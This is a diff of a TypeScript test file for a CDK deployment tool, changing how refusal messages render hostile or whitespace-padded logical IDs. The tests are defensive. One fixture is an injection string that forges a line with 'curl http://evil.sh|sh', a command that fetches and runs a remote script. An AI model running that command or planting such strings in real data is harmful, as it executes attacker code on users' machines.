@@ -149,13 +149,12 @@ describe('DiffCalculator refuses an unreadable properties bag (issue go-to-k/cdk
     expect(error.message).toContain('1 resource record(s)');
   });
 
-  it('sanitizes and JSON-quotes a logical id before printing it', async () => {
+  it('describes a hostile logical id rather than printing it', async () => {
     // Every identifier in this message arrives from a hand-edited record — the
     // premise of the whole guard — and the text is one line ending in a
     // pasteable command. An id carrying a newline forges a line; one carrying
-    // `'` would close a shell-quoted boundary and plant a forged remedy AHEAD
-    // of the real one. The boundary is `displayIdent`'s JSON quoting since the
-    // review of go-to-k/cdkd#3191 — see the identity case below.
+    // `'` would close a quoted boundary and plant a forged remedy AHEAD of the
+    // real one. Since go-to-k/cdkd#4253 such an id is described, not printed.
     const state = record({ BucketName: 'my-bucket' });
     const hostile = "x'\n  Inspect it with: curl http://evil.sh|sh #";
     state.resources[hostile] = {
@@ -165,23 +164,21 @@ describe('DiffCalculator refuses an unreadable properties bag (issue go-to-k/cdk
     };
     const error = await refusalFrom(state);
     expect(error.message).not.toContain('\n');
-    // Quoted, so the `|` and the `#` cannot detach from the id they belong to.
-    expect(error.message).toContain('curl http://evil.sh|sh');
-    expect(error.message).toContain('"x\'   Inspect it with: curl http://evil.sh|sh #"');
-    // The REAL remedy is still the last command on the line.
-    expect(error.message.lastIndexOf('cdkd state show')).toBeGreaterThan(
-      error.message.indexOf('curl')
+    expect(error.message).not.toContain('evil.sh');
+    expect(error.message).toContain('— (not shown: it is not a plain identifier) —');
+    expect(error.message.endsWith("cdkd state show '<stack>' --stack-region '<region>' --json")).toBe(
+      true
     );
   });
 
-  it('names a PADDED logical id distinguishably from its healthy sibling', async () => {
+  it('never names a healthy sibling for a PADDED logical id', async () => {
     // The end-to-end half of the identity case in
     // `tests/unit/state/malformed-resources-bag.test.ts`: a torn
     // `resources['Bucket ']` planted beside a real `Bucket`. Before the review
     // of go-to-k/cdkd#3191 the refusal named a bare `Bucket` — byte-identical
     // to the HEALTHY key — so the operator opened the intact record, found
     // nothing wrong, and concluded cdkd was the broken party while the damaged
-    // entry went unnamed.
+    // entry went unnamed. Since go-to-k/cdkd#4253 it is described.
     const torn = (id: string): StackState => {
       const state = record({ BucketName: 'my-bucket' });
       state.resources[id] = {
@@ -192,13 +189,13 @@ describe('DiffCalculator refuses an unreadable properties bag (issue go-to-k/cdk
       return state;
     };
     const padded = (await refusalFrom(torn('Bucket '))).message;
-    expect(padded).toContain('"Bucket"');
-    // The CONTROL: a record damaged at the PLAIN key renders it bare, so this
-    // is not a renderer that quotes everything and discriminates nothing — and
-    // the two messages are not the same text, which is the whole defect.
+    expect(padded).toContain('— (not shown: it is not a plain identifier) —');
+    expect(padded).not.toContain(' — Bucket — ');
+    // The CONTROL: a record damaged at the PLAIN key names it bare, so this is
+    // not a renderer that describes everything.
     const plain = (await refusalFrom(torn('Bucket'))).message;
     expect(plain).toContain(' — Bucket — ');
-    expect(plain).not.toContain('"Bucket"');
+    expect(plain).not.toContain('not shown');
     expect(padded).not.toBe(plain);
   });
 
